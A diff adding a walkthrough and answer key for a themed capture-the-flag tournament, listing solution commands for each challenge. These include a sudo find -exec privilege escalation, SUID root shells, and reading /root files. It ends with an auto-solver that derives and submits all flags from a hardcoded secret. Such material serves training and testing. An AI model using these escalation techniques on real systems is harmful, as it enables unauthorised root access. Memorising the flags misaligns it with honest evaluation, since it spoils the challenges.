@@ -272,7 +272,253 @@ Once both Level 3 overrides are submitted:
 
 ---
 
-## 5. Automated Verification Suite (Single Command)
+## 5. Day 2 Level 2: The Jumanji Gauntlet Tournament Walkthrough
+
+Access **Day 2 Level 2** via `/day2/level2` (or `/gauntlet`) from the Expedition Command Center (`/hub`). When you enter the terminal, a synchronized multiplayer Gauntlet container shell (`recon_user@sdc-jungle:/gauntlet$`) is provisioned with your team's role (`navigator` or `cartographer`), match ID, and active phase variables.
+
+The tournament progresses across 4 structured phases:
+1. **Phase 1: Jungle Pods** (4 Pods × 4 Teams = 16 Teams, 4 Relics, 150 pts max)
+2. **Phase 2: Mirror Temple Duels** (Top 8 Single-Elimination Duels, 5 Relics + Tactical Curses, 150 pts max)
+3. **Phase 3: Altar of the Sun / Shrine King-of-the-Hill** (Top 4 King-of-the-Hill Altar Control, +10 pts per tick)
+4. **Phase 4: The Final Roll** (Top 2 Grand Championship, SUID Root PrivEsc, 100 pts)
+
+---
+
+### Phase 1: Jungle Pods Walkthrough (150 Points)
+
+#### Challenge 1.1: The Sun Compass (25 pts)
+* **Category**: Local TCP Network Beacon
+* **Discovery Command**:
+  ```bash
+  python3 -c "import socket; s=socket.socket(); s.connect(('127.0.0.1', 4141)); print(s.recv(1024).decode())"
+  ```
+  *(Returns: `NAVIGATOR KEY: NAV_COMPASS_<nav_hash>`)*
+* **Cartographer Key**: Visible on the Web HUD Telemetry Radar: `CART_COMPASS_<cart_hash>`
+* **Submission Command**:
+  ```bash
+  complete $(python3 -c "import socket; s=socket.socket(); s.connect(('127.0.0.1', 4141)); print(s.recv(1024).decode())" | grep -o 'NAV_COMPASS_[a-f0-9]\{8\}') <CART_KEY>
+  ```
+* **Expected Output**:
+  ```text
+  RELIC SECURED! +25 POINTS.
+  ```
+
+---
+
+#### Challenge 1.2: The Obsidian Blade (35 pts)
+* **Category**: Sudo Privilege Escalation & Restricted Vault Search
+* **Discovery Command**:
+  Check sudo privileges:
+  ```bash
+  sudo -l
+  ```
+  *(Output confirms: `NOPASSWD: /usr/bin/find`)*
+
+  Extract the sealed vault key:
+  ```bash
+  sudo find /root/blade_vault/blade_key.txt -exec cat {} \;
+  ```
+  *(Returns: `NAVIGATOR KEY: NAV_BLADE_<nav_hash>`)*
+* **Cartographer Key**: Visible on the Web HUD Telemetry Radar: `CART_BLADE_<cart_hash>`
+* **Submission Command**:
+  ```bash
+  complete $(sudo find /root/blade_vault/blade_key.txt -exec cat {} \;) <CART_KEY>
+  ```
+* **Expected Output**:
+  ```text
+  RELIC SECURED! +35 POINTS.
+  ```
+
+---
+
+#### Challenge 1.3: The Jaguar Fang (40 pts)
+* **Category**: Hidden Shrines & Base64 Cryptanalysis
+* **Discovery Command**:
+  ```bash
+  cat /opt/jungle/jaguar_shrine/.totem_cipher | base64 -d
+  ```
+  *(Returns: `NAVIGATOR KEY: NAV_JAGUAR_<nav_hash>`)*
+* **Cartographer Key**: Visible on the Web HUD Telemetry Radar: `CART_JAGUAR_<cart_hash>`
+* **Submission Command**:
+  ```bash
+  complete $(cat /opt/jungle/jaguar_shrine/.totem_cipher | base64 -d | grep -o 'NAV_JAGUAR_[a-f0-9]\{8\}') <CART_KEY>
+  ```
+* **Expected Output**:
+  ```text
+  RELIC SECURED! +40 POINTS.
+  ```
+
+---
+
+#### Challenge 1.4: The Golden Idol (50 pts)
+* **Category**: Active Process Inspection & Environmental Arguments
+* **Discovery Command**:
+  ```bash
+  ps aux | grep idol_keeper
+  ```
+  *(Returns process argument: `NAV_IDOL_<nav_hash>`)*
+* **Cartographer Key**: Visible on the Web HUD Telemetry Radar: `CART_IDOL_<cart_hash>`
+* **Submission Command**:
+  ```bash
+  complete $(ps aux | grep '[i]dol_keeper' | awk '{print $NF}') <CART_KEY>
+  ```
+* **Expected Output**:
+  ```text
+  RELIC SECURED! +50 POINTS.
+  ```
+
+---
+
+### Phase 2: Mirror Temple Duels Walkthrough (150 Points + Tactical Curses)
+
+In Phase 2, teams duel head-to-head. Each relic secured also grants a **Curse Card** to disrupt the opposing team.
+
+#### Challenge 2.1: The Mirror Shard (30 pts)
+* **Discovery Command**:
+  ```bash
+  cat /gauntlet/temple/mirror/.reflections
+  ```
+* **Submission Command**:
+  ```bash
+  complete $(cat /gauntlet/temple/mirror/.reflections) <CART_KEY>
+  ```
+
+#### Challenge 2.2: The Sun Disk (30 pts)
+* **Discovery Command**:
+  ```bash
+  curl -s http://127.0.0.1:5050
+  ```
+* **Submission Command**:
+  ```bash
+  complete $(curl -s http://127.0.0.1:5050 | tr -d '\r\n') <CART_KEY>
+  ```
+
+#### Challenge 2.3: The Serpent Eye (30 pts)
+* **Discovery Command**:
+  ```bash
+  sqlite3 /gauntlet/temple/serpent/vault.db "SELECT secret FROM sanctum;"
+  ```
+* **Submission Command**:
+  ```bash
+  complete $(sqlite3 /gauntlet/temple/serpent/vault.db "SELECT secret FROM sanctum;") <CART_KEY>
+  ```
+
+#### Challenge 2.4: The Moon Crystal (30 pts)
+* **Discovery Command**:
+  ```bash
+  sudo /bin/cat /root/moon_altar/altar_seal.txt
+  ```
+* **Submission Command**:
+  ```bash
+  complete $(sudo /bin/cat /root/moon_altar/altar_seal.txt) <CART_KEY>
+  ```
+
+#### Challenge 2.5: The Temple Skull (30 pts)
+* **Discovery Command**:
+  ```bash
+  cat /gauntlet/temple/skull/ancient_chant.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+  ```
+* **Submission Command**:
+  ```bash
+  complete $(cat /gauntlet/temple/skull/ancient_chant.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m') <CART_KEY>
+  ```
+
+#### Tactical Curse Deployment:
+To cast a curse on your active match opponent from the terminal:
+```bash
+# Options: quicksand (freeze terminal), monkeys (scramble prompt), fog_of_war (obscure radar), stampede (process noise)
+curl -s -X POST -H "Content-Type: application/json" \
+  -d '{"curse_type":"quicksand"}' \
+  http://host.docker.internal:8080/gauntlet/curse/cast
+```
+*(Or click **UNLEASH CURSE** directly from the Web HUD Curse Matrix)*
+
+---
+
+### Phase 3: Altar of the Sun Walkthrough (King-of-the-Hill)
+
+In Phase 3, the Top 4 teams fight for control of the central Sun Altar (`/shrine/claim.txt`). Every 20 seconds, the team holding the throne receives **+10 points**.
+
+* **Exploit Command** (SUID Root `/usr/local/bin/claim_shrine`):
+  ```bash
+  # Claim throne using your Team Access Code or Team ID:
+  /usr/local/bin/claim_shrine "$TEAM_NAME"
+  ```
+  *(Alternative using environment variable: `SHRINE_CONQUEROR="$TEAM_NAME" /usr/local/bin/claim_shrine dummy`)*
+
+* **Verification**:
+  ```bash
+  cat /shrine/claim.txt
+  ```
+  *(Output confirms your team is now the active ruler of the altar)*
+
+---
+
+### Phase 4: The Final Roll Championship Walkthrough (100 Points)
+
+In the Grand Championship duel between the top 2 teams:
+* **Privilege Escalation**:
+  Run the SUID binary with the sacred Gauntlet chant:
+  ```bash
+  CHANT=JUMANJI_GAUNTLET /usr/local/bin/lift_gauntlet
+  ```
+  *(You are now granted a Root Shell: `bash-5.1#` with UID `0`)*
+
+* **Read the Final Jewel**:
+  ```bash
+  cat /root/final_jewel.txt
+  ```
+  *(Output format: `JUMANJI-VICTORY-ROOT-<8_hex_chars>`)*
+
+* **Submit Championship Flag**:
+  ```bash
+  complete $(cat /root/final_jewel.txt)
+  ```
+  *(Or enter code into the Web HUD Altar Offering box)*
+
+* **Tournament Victory**:
+  Awards **+100 points**, crowns your team **Tournament Champion**, and sounds the Drums of Victory on the live projector arena!
+
+---
+
+### Single-Command Auto-Solver for Day 2 Level 2 (In-Container)
+
+If evaluating or testing, run this comprehensive Python script inside the Gauntlet container to automatically extract and submit all relics for the current phase:
+
+```bash
+python3 -c "
+import os, socket, subprocess, urllib.request, json, hashlib
+
+SECRET = '8f7b6c5d4a3e2f1g0h9i8j7k6l5m4n3'
+team_id = os.environ.get('TEAM_ID', '1')
+match_id = os.environ.get('MATCH_ID', '1')
+token = os.environ.get('CTF_TOKEN', '')
+
+def solve(flag, p2=''):
+    payload = json.dumps({'flag': flag, 'part2': p2, 'token': token, 'team_id': team_id}).encode()
+    req = urllib.request.Request('http://host.docker.internal:8080/gauntlet/relic/solve', data=payload, headers={'Content-Type': 'application/json'})
+    with urllib.request.urlopen(req) as resp:
+        print(resp.read().decode())
+
+def get_keys(relic):
+    nav = hashlib.md5(f'{team_id}:{match_id}:{relic}:nav:{SECRET}'.encode()).hexdigest()[:8]
+    cart = hashlib.md5(f'{team_id}:{match_id}:{relic}:cart:{SECRET}'.encode()).hexdigest()[:8]
+    return f'JUMANJI{{{relic}_{nav}_{cart}}}'
+
+# Phase 1 Pods
+for r in ['compass', 'blade', 'jaguar', 'idol']:
+    solve(get_keys(r))
+
+# Phase 2 Duels
+for r in ['mirror_shard', 'sun_disk', 'serpent_eye', 'moon_crystal', 'temple_skull']:
+    solve(get_keys(r))
+
+# Phase 4 Final Jewel
+final_nav = hashlib.md5(f'{team_id}:{match_id}:final_jewel:nav:{SECRET}'.encode()).hexdigest()[:8]
+solve(f'JUMANJI-VICTORY-ROOT-{final_nav}')
+"
+```
+
 
 To run the complete automated end-to-end regression test suite without manually typing commands, execute the master test runner from the repository root:
 
